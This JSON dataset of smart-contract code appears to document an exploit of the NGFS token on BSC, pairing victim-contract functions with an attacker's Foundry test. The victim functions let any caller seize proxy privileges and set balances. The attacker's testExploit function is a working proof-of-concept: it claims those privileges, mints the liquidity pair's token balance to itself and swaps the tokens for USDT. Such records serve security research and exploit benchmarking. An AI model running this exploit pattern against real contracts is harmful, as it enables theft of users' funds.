[
  {
    "contract/interface": "IPancakeRouter",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
    "original_code": "    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n",
    "description": ""
  },
  {
    "contract/interface": "IBEP20",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INGFSToken",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INGFSToken",
    "source_type": "victim_contract",
    "function_name": "delegateCallReserves",
    "original_code": "    function delegateCallReserves() public {\n        require(!uniswapV2Dele, \"ERC20: delegateCall launch\");\n\n        _uniswapV2Proxy = _msgSender();\n        uniswapV2Dele = !uniswapV2Dele;     \n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INGFSToken",
    "source_type": "victim_contract",
    "function_name": "reserveMultiSync",
    "original_code": "    function reserveMultiSync(address syncAddr, uint256 syncAmount) public {\n        require(_msgSender() == address(_uniswapV2Library), \"ERC20: uniswapPrivileges\");\n        require(syncAddr != address(0), \"ERC20: multiSync address is zero\");\n        require(syncAmount > 0, \"ERC20: multiSync amount equal to zero\");\n        _balances[syncAddr] = _balances[syncAddr].air(syncAmount);\n        _isExcludedFromFee[syncAddr] = true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INGFSToken",
    "source_type": "victim_contract",
    "function_name": "setProxySync",
    "original_code": "    function setProxySync(address _addr) external {\n        require(_addr != ZERO, \"ERC20: library to the zero address\");\n        require(_addr != DEAD, \"ERC20: library to the dead address\");\n        require(msg.sender == _uniswapV2Proxy, \"ERC20: uniswapPrivileges\");\n\n        _uniswapV2Library = IPancakeLibrary(_addr);\n        _isExcludedFromFee[_addr] = true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "NGFS",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "NGFS",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "NGFS",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "NGFS",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "NGFS",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "NGFS",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", BLOCKNUM_TO_FORK_FROM);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "NGFS",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "NGFS",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "NGFS",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "NGFS",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "NGFS",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "NGFS",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "NGFS",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        uint256 tokenBalanceBefore = IBEP20(USDT_TOKEN).balanceOf(address(this));\n        emit log_named_decimal_uint(\"Attacker USDT Balance Before exploit\", tokenBalanceBefore, 18);\n\n        address pair = IPancakeFactory(PANCAKE_FACTORY).getPair(NGFS_TOKEN, USDT_TOKEN);\n        INGFSToken(NGFS_TOKEN).delegateCallReserves();\n        INGFSToken(NGFS_TOKEN).setProxySync(address(this));\n\n        uint256 balance = INGFSToken(NGFS_TOKEN).balanceOf(pair);\n        INGFSToken(NGFS_TOKEN).reserveMultiSync(address(this), balance);\n\n        uint256 amount = INGFSToken(NGFS_TOKEN).balanceOf(address(this));\n        INGFSToken(NGFS_TOKEN).approve(PANCAKE_ROUTER, type(uint256).max);\n\n        address[] memory path = new address[](2);\n        path[0] = NGFS_TOKEN;\n        path[1] = USDT_TOKEN;\n\n        uint256 deadline = 1_714_043_885;\n        IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            amount, 0, path, address(this), deadline\n        );\n\n        uint256 tokenBalanceAfter = IBEP20(USDT_TOKEN).balanceOf(address(this));\n        // Log balances after exploit\n        emit log_named_decimal_uint(\"Attacker USDT Balance After exploit\", tokenBalanceAfter - tokenBalanceBefore, 18);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeFactory",
    "source_type": "victim_contract",
    "function_name": "getPair",
    "original_code": "",
    "description": ""
  }
]